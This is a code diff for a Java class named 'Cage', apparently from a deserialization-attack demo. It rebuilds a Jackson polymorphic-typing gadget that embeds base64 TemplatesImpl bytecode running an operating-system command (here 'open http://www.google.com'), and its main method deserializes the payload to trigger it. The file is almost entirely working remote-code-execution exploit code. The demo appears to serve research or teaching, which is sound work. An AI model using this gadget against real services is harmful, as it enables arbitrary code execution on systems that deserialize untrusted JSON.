@@ -22,22 +22,23 @@
 
 package jackson;
 
+import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
-import java.util.LinkedHashMap;
-import java.util.Map;
-import java.util.Properties;
 
+import com.fasterxml.jackson.databind.node.ArrayNode;
+import com.fasterxml.jackson.databind.node.ObjectNode;
 import javassist.CannotCompileException;
 import javassist.NotFoundException;
 import ser05j.Reflections;
 
 import java.util.Base64;
-import java.util.Map.Entry;
 
 public class Cage {
+
+  private static final ObjectMapper mapper = new ObjectMapper();
 
   private static Object deserialize(String data) throws IOException {
     ObjectMapper mapper = new ObjectMapper();
@@ -46,82 +47,48 @@ public class Cage {
     return mapper.readValue(data, Object.class);
   }
 
-  private static String quoteString(String string) {
-    return '"' + string + '"';
+  private static byte[] createMaliciousByteCodes()
+      throws IOException, InstantiationException, InvocationTargetException, NoSuchFieldException,
+             IllegalAccessException, CannotCompileException, NotFoundException, ClassNotFoundException,
+             NoSuchMethodException {
+    String[] args = {"open", "http://www.google.com"};
+    Object tpl = TemplatesUtil.createTemplatesImpl(args);
+    return ((byte[][]) Reflections.getFieldValue(tpl, "_bytecodes"))[0];
   }
 
-  private static void writeProperty(StringBuilder sb, String key, String value) {
-    sb.append('"').append(key).append('"');
-    sb.append(':');
-    sb.append(value);
-  }
+  private static JsonNode createTemplateValues()
+      throws IOException, InstantiationException, InvocationTargetException, NoSuchFieldException,
+             IllegalAccessException, CannotCompileException, NotFoundException, ClassNotFoundException,
+             NoSuchMethodException {
+    ObjectNode values = mapper.createObjectNode();
+    byte[] byteCodes = createMaliciousByteCodes();
+    String encodedByteCodes = Base64.getEncoder().encodeToString(byteCodes);
 
-  private static String writeObject(String type, Map<String, String> properties) {
-    StringBuilder sb = new StringBuilder();
-    sb.append('[');
-    sb.append('"').append(type).append('"');
-    sb.append(',');
-    sb.append('{');
-    boolean first = true;
-    for (Entry<String, String> e : properties.entrySet()) {
-      if (!first) {
-        sb.append(',');
-      } else {
-        first = false;
-      }
-      writeProperty(sb, e.getKey(), e.getValue());
-    }
-    sb.append('}');
-    sb.append(']');
-    return sb.toString();
-  }
+    ArrayNode transletBytescodes = mapper.createArrayNode();
+    transletBytescodes.add(encodedByteCodes);
+    values.set("transletBytecodes", transletBytescodes);
 
-  private static String writeArray(String... elements) {
-    StringBuilder sb = new StringBuilder();
-    sb.append('[');
-    boolean first = true;
-    for (String elem : elements) {
-      if (!first) {
-        sb.append(',');
-      } else {
-        first = false;
-      }
-      sb.append(elem);
-    }
-    sb.append(']');
-    return sb.toString();
+    values.put("transletName", "foo");
+    values.set("outputProperties", mapper.createObjectNode());
+    return values;
   }
 
   public static String rcePayload() throws
       IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
       NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
-    String[] args = {"open", "http://www.google.com"};
-    Object tpl = TemplatesUtil.createTemplatesImpl(args);
-    byte[][] bytecodes = (byte[][]) Reflections.getFieldValue(tpl, "_bytecodes");
-    Map<String, String> values = new LinkedHashMap<>();
-    String base64 = Base64.getEncoder().encodeToString(bytecodes[0]);
-    values.put("transletBytecodes", writeArray(quoteString(base64)));
-    values.put("transletName", quoteString("foo"));
-    values.put("outputProperties", "{}");
-    if (Boolean.parseBoolean(System.getProperty("upstreamXalan", "false"))) {
-      return writeObject("org.apache.xalan.xsltc.trax.TemplatesImpl", values);
-    }
-    return writeObject("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", values);
+    JsonNode templateValues = createTemplateValues();
+    ArrayNode wrapperNode = mapper.createArrayNode();
+    wrapperNode.add("org.apache.xalan.xsltc.trax.TemplatesImpl");
+    wrapperNode.add(templateValues);
+    return mapper.writerWithDefaultPrettyPrinter().writeValueAsString(wrapperNode);
   }
 
-  public static void main(String[] args) throws
-      IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
-      NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
-    Properties props = System.getProperties();
-    props.setProperty("upstreamXalan", "true");
+  public static void main(String[] args) throws Exception {
 
     // Writes gadget by hand and then deserializes using unmarshal
     String json = rcePayload();
-    System.out.println(json);
-    Object obj = deserialize(json);
-    Class cls = obj.getClass();
-    System.out.println("The type of the object is: " + cls.getName());
-    System.out.println(obj);
+    System.out.println("Malicious json: " + json);
+    deserialize(json);
   }
 
 } // end class Cage
